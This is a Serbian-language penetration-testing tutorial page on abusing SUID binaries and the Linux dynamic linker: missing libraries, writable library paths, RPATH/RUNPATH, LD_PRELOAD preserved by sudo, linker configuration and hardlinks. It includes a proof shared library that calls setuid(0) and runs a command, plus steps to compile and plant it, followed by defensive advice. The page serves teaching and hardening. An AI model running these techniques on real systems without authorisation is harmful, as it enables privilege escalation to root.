# SUID zloupotreba deljene biblioteke i linkera

{{#include ../../banners/hacktricks-training.md}}

SUID binarije se obično proveravaju zbog direktnog izvršavanja komandi, ali prilagođeni SUID programi takođe mogu biti ranjivi preko dynamic linkera. Zajednička karakteristika je jednostavna: privilegovani izvršni fajl učitava kod sa putanje ili iz konfiguracije na koju korisnik sa nižim privilegijama može da utiče.

Ova stranica se fokusira na opšte obrasce tehnika: biblioteke koje nedostaju, direktorijume biblioteka sa dozvolom upisivanja, `RPATH`/`RUNPATH`, `LD_PRELOAD` kroz sudo, konfiguraciju linkera i zabunu izazvanu SUID hardlinkovima.

## Brza enumeracija

Započnite pronalaženjem neuobičajenih SUID fajlova i proverom da li su dinamički linkovani:
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Usredsredite se na nestandardne lokacije, putanje prilagođenih aplikacija, binarne datoteke u vlasništvu root korisnika, ali izvan direktorijuma kojima upravljaju paketi, kao i zavisnosti učitane iz direktorijuma u koje je moguće upisivati.

Korisne provere mogućnosti upisa:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Neki prilagođeni SUID binaries pokušavaju da učitaju shared object koji ne postoji. Ako se putanja koja nedostaje nalazi u direktorijumu kojim upravlja napadač, binary može učitati kod koji je dostavio napadač kao effective user.

Pronađite neuspešna traženja biblioteka:
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Ako binarna datoteka pretražuje putanju sa dozvolom upisa za `libexample.so`, minimalna proof biblioteka može koristiti constructor. Tokom validacije, proof-of-impact treba da ostane bezopasan:
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Kompajlirajte ga sa tačnim nazivom fajla koji binarna datoteka pokušava da učita:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
Uslov koji se može iskoristiti nije samo nedostajuća biblioteka. Napadač mora moći da postavi kompatibilni shared object na putanju koju će privilegovani loader prihvatiti.

## Direktorijum biblioteka sa dozvolom upisa

Ponekad sve dependencies postoje, ali je jedan od direktorijuma koji se koriste za njihovo pronalaženje upisiv. To može omogućiti zamenu učitane biblioteke ili postavljanje biblioteke višeg prioriteta sa istim nazivom.

Pregledajte putanje dependencies:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Ako je direktorijum upisiv, proverite to pristupom bezbednim za kopiranje u lab okruženju. Zamena sistemskih biblioteka na aktivnom hostu može prekinuti autentifikaciju, upravljanje paketima ili servise kritične za pokretanje sistema.

## RPATH i RUNPATH

`RPATH` i `RUNPATH` su stavke dinamičke sekcije koje loaderu govore gde da traži biblioteke. Opasne su u SUID programima kada upućuju na direktorijume u koje attacker može da upisuje.

Detektujte ih:
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Primer rizičnog izlaza:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Ako je `/opt/app/lib` upisiv i binarni fajl zahteva `libcustom.so`, napadač možda može tamo da postavi zlonamerni `libcustom.so`:
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` i `RUNPATH` nisu identični u svim detaljima razrešavanja, ali je za pregled eskalacije privilegija praktično pitanje isto: da li SUID binary pretražuje direktorijum u koji attacker može da upisuje, tražeći naziv library-ja?

## LD_PRELOAD, LD_LIBRARY_PATH i SUID

Kod normalnih programa, `LD_PRELOAD` i `LD_LIBRARY_PATH` mogu da primoraju ili utiču na učitavanje shared object-a. Kod SUID programa, dynamic loader obično prelazi u secure-execution mode i ignoriše opasne environment variables.

To znači da običan SUID binary obično nije ranjiv samo zato što user može da postavi `LD_PRELOAD`:
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Uobičajeni izuzetak je pogrešna konfiguracija alata `sudo`. Ako `sudo -l` pokazuje da se promenljiva kao što je `LD_PRELOAD` ili `LD_LIBRARY_PATH` čuva, komanda dozvoljena putem sudo-a može učitati kod pod kontrolom napadača:
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Ne mešajte sledeće slučajeve:

- `LD_PRELOAD` protiv normalnog SUID binary-ja: obično blokiran zbog secure execution.
- `LD_PRELOAD` očuvan pomoću sudo: potencijalno exploitable.
- Nedostajući `.so` u writable putanji: exploitable kada SUID binary prirodno učitava tu putanju.
- `RPATH`/`RUNPATH` ka writable direktorijumu: exploitable kada potrebna biblioteka može da se kontroliše.
- Pristup za upis u `/etc/ld.so.preload` ili linker konfiguraciju: uticaj na ceo sistem i visok rizik.

## Konfiguracija linker-a

Dinamički linker takođe čita sistemsku konfiguraciju, kao što su `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, linker cache i, u nekim slučajevima, `/etc/ld.so.preload`.

Najvažnije provere:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Konfiguracija linker-a sa dozvolom upisa obično je ozbiljnija od jednog ranjivog SUID binary-ja, jer može uticati na mnoge dinamički linkovane procese. `/etc/ld.so.preload` je posebno opasan zato što može prinudno ubaciti shared object u privilegovane procese.

## SUID Hardlink Confusion

Hardlink-ovi mogu učiniti da se isti SUID inode pojavljuje pod više imena. Ovo je korisno za skrivanje privilegovanog helper-a, zbunjivanje cleanup-a ili zaobilaženje naivnog path-based pregleda.

Pronađite SUID fajlove sa više od jednog linka:
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Proverite sve putanje do istog inode-a:
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
Zloupotreba nije u tome što hardlink menja dozvole. Zloupotreba je zabuna u putanji: privilegovani inode može biti dostupan preko imena koje administratori ili skripte ne očekuju. Za detaljniji opis inode-a i rada sa hardlinkovima pogledajte [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Odbrambene napomene

- SUID binarne fajlove održavajte minimalnim, proveravajte ih i, gde je moguće, upravljajte njima putem package managera.
- Izbegavajte `RPATH`/`RUNPATH` unose koji upućuju na direktorijume u koje korisnici mogu upisivati ili kojima upravlja aplikacija.
- Direktorijumi sa library datotekama treba da budu u vlasništvu root korisnika i da obični korisnici ne mogu u njih upisivati.
- Nemojte zadržavati `LD_PRELOAD`, `LD_LIBRARY_PATH` ili slične promenljive loadera kroz sudo.
- Nadgledajte `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` i neočekivane SUID datoteke.
- Pregledajte SUID datoteke sa hardlinkovima i istražite prilagođene SUID wrapper-e izvan standardnih sistemskih putanja.
